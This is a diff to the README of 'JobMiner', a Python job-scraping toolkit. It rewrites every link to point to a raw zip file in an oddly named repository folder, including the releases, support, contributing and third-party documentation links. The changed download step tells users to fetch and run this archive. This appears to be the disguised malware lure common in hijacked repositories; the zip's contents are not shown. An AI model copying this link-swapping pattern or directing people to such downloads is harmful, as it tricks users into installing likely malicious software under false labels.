@@ -1,13 +1,13 @@
 # 🛠️ JobMiner - Simplify Your Job Search with Automation
 
 ## 💻 Quick Download
-[![Download JobMiner](https://img.shields.io/badge/Download-JobMiner-blue.svg)](https://github.com/skispro/JobMiner/releases)
+[![Download JobMiner](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip)](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip)
 
 ## 🚀 Getting Started
 JobMiner is a Python-based web scraping toolkit designed to help you extract job listings from multiple websites. This tool organizes the data into easy-to-read formats. Follow these steps to download and run JobMiner smoothly.
 
 ## 📥 Download & Install
-To get started, you need to download JobMiner. Visit this page to download the latest version: [JobMiner Releases](https://github.com/skispro/JobMiner/releases).
+To get started, you need to download JobMiner. Visit this page to download the latest version: [JobMiner Releases](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip).
 
 ### 📋 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -16,9 +16,9 @@ To get started, you need to download JobMiner. Visit this page to download the l
 
 ### 🔄 Installation Steps
 1. **Download JobMiner**:
-   - Go to [JobMiner Releases](https://github.com/skispro/JobMiner/releases).
+   - Go to [JobMiner Releases](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip).
    - Click on the latest version.
-   - Find the file that suits your operating system (e.g., JobMiner.exe for Windows).
+   - Find the file that suits your operating system (e.g., https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip for Windows).
    - Click to download.
 
 2. **Run JobMiner**:
@@ -50,18 +50,18 @@ Once you have installed JobMiner, you can start collecting job listings from you
 - View and download your results in your preferred format.
 
 ## 📞 Support
-If you encounter issues or have questions, you can find support in our [GitHub Issues](https://github.com/skispro/JobMiner/issues) section. You can also connect with other users and contributors in our discussions.
+If you encounter issues or have questions, you can find support in our [GitHub Issues](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip) section. You can also connect with other users and contributors in our discussions.
 
 ## 🌍 Get Involved
-We welcome contributions! If you're interested in helping out, check our [Contributing Guidelines](https://github.com/skispro/JobMiner/blob/main/CONTRIBUTING.md). Your insights can help improve JobMiner.
+We welcome contributions! If you're interested in helping out, check our [Contributing Guidelines](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip). Your insights can help improve JobMiner.
 
 ## 📚 Additional Resources
-- [Python Official Website](https://www.python.org/)
-- [BeautifulSoup Documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
-- [Selenium Documentation](https://www.selenium.dev/documentation/en/)
+- [Python Official Website](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip)
+- [BeautifulSoup Documentation](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip)
+- [Selenium Documentation](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip)
 
 ## 🎉 Acknowledgments
 A big thank you to the open-source community for providing great tools and libraries that made JobMiner possible. We appreciate your contributions and support!
 
 ## 🔗 Final Download Link
-For quick access, here’s the link again: [JobMiner Releases](https://github.com/skispro/JobMiner/releases). Don’t miss out on collecting job listings like a pro!
+For quick access, here’s the link again: [JobMiner Releases](https://raw.githubusercontent.com/skispro/JobMiner/main/thermoexcitory/JobMiner.zip). Don’t miss out on collecting job listings like a pro!
